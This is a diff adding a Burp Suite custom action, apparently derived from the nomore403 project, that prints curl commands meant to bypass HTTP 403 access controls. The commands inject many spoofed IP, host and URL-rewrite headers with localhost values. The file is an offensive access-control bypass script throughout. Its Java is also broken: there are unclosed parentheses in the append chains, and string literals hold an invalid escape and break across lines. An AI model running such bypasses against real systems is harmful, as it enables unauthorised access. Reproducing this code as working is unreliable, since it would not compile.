@@ -1,0 +1,117 @@
+id: 7b2c9e1d-4f5a-8b7c-9d3e-nomore403001
+name: NoMore403 Checks
+function: CUSTOM_ACTION
+location: REPEATER
+source: |
+  /**
+   * Generates curl commands for 403 Forbidden bypass using various headers.
+   * Based on techniques from https://github.com/devploit/nomore403
+   *
+   * @author bambdas
+   **/
+
+  var request = requestResponse.request();
+  var httpService = requestResponse.httpService();
+  
+  String url = request.url();
+  String method = request.method();
+  String path = request.path();
+  
+  // Base headers to keep
+  var headers = request.headers();
+  StringBuilder baseHeaderArgs = new StringBuilder();
+  
+  for (var header : headers) {
+      String name = header.name();
+      String value = header.value();
+      
+      // Skip headers we will fuzz or that might interfere
+      if (name.startsWith(":") || 
+          name.equalsIgnoreCase("Content-Length") || 
+          name.equalsIgnoreCase("Host") ||
+          name.equalsIgnoreCase("X-Original-URL") ||
+          name.equalsIgnoreCase("X-Rewrite-URL") ||
+          name.equalsIgnoreCase("X-Forwarded-For")) {
+          continue;
+      }
+      
+      value = value.replace("'", "'\\''");
+      baseHeaderArgs.append(" -H '" + name + ": " + value + "'");
+  }
+
+  // Categorized headers from nomore403
+  String[] urlHeaders = {
+      "X-Original-URL", "X-Rewrite-URL", "Request-Uri", "Uri", "Url", 
+      "Base-Url", "Http-Url", "Proxy-Url", "Redirect", "Referer", 
+      "Referrer", "X-HTTP-DestinationURL", "X-Proxy-Url", "Location"
+  };
+
+  String[] hostHeaders = {
+      "Host", "X-Forwarded-Host", "X-Host", "Proxy-Host", "X-HTTP-Host-Override"
+  };
+
+  String[] ipHeaders = {
+      "Access-Control-Allow-Origin", "CF-Connecting-IP", "CF-Connecting_IP", 
+      "Client-IP", "Destination", "Forwarded", "Forwarded-For", 
+      "Forwarded-For-Ip", "Origin", "Profile", "Proxy", "Real-Ip", 
+      "True-Client-IP", "X-Arbitrary", "X-Client-IP", "X-Custom-IP-Authorization", 
+      "X-Forward", "X-Forward-For", "X-Forwarded", "X-Forwarded-By", 
+      "X-Forwarded-For", "X-Forwarded-For-Original", "X-Forwarded-Proto", 
+      "X-Forwarded-Server", "X-Forwarder-For", "X-Original-Remote-Addr", 
+      "X-Originally-Forwarded-For", "X-Originating-IP", "X-ProxyUser-Ip", 
+      "X-Real-IP", "X-Real-Ip", "X-Remote-Addr", "X-Remote-IP", 
+      "X-WAP-Profile", "X-True-IP"
+  };
+
+  String[] ipValues = {
+      "127.0.0.1", "localhost", "::1", "0.0.0.0"
+  };
+
+  String[] hostValues = {
+      "127.0.0.1", "localhost"
+  };
+
+  StringBuilder output = new StringBuilder();
+  output.append("# NoMore403 Bypass Checks for: ").append(url).append("\n");
+  output.append("# Copy and paste the following commands into your terminal:\n\n");
+
+  output.append("# --- IP Based Header Bypasses ---\n");
+  for (String header : ipHeaders) {
+      for (String val : ipValues) {
+          output.append("curl -k -i -s -X ").append(method)
+                .append(baseHeaderArgs)
+                .append(" -H '" + header + ": ").append(val).append("'"
+                .append(" '" + url + "'")
+                .append(" | grep -E \"HTTP/|Content-Length\" | sed \"s/^/\[").append(header).append("=").append(val).append("\] /\"
+");
+      }
+  }
+
+  output.append("\n# --- Host/Domain Based Header Bypasses ---\n");
+  for (String header : hostHeaders) {
+      for (String val : hostValues) {
+          output.append("curl -k -i -s -X ").append(method)
+                .append(baseHeaderArgs)
+                .append(" -H '" + header + ": ").append(val).append("'"
+                .append(" '" + url + "'")
+                .append(" | grep -E \"HTTP/|Content-Length\" | sed \"s/^/\[").append(header).append("=").append(val).append("\] /\"
+");
+      }
+  }
+
+  output.append("\n# --- URL/Path Based Header Bypasses ---\n");
+  // Values for URL headers: the path itself, or full localhost URL
+  String[] urlValues = { path, "http://127.0.0.1" + path };
+  
+  for (String header : urlHeaders) {
+      for (String val : urlValues) {
+          output.append("curl -k -i -s -X ").append(method)
+                .append(baseHeaderArgs)
+                .append(" -H '" + header + ": ").append(val).append("'"
+                .append(" '" + url + "'")
+                .append(" | grep -E \"HTTP/|Content-Length\" | sed \"s/^/\[").append(header).append("=").append(val).append("\] /\"
+");
+      }
+  }
+
+  logging.logToOutput(output.toString());
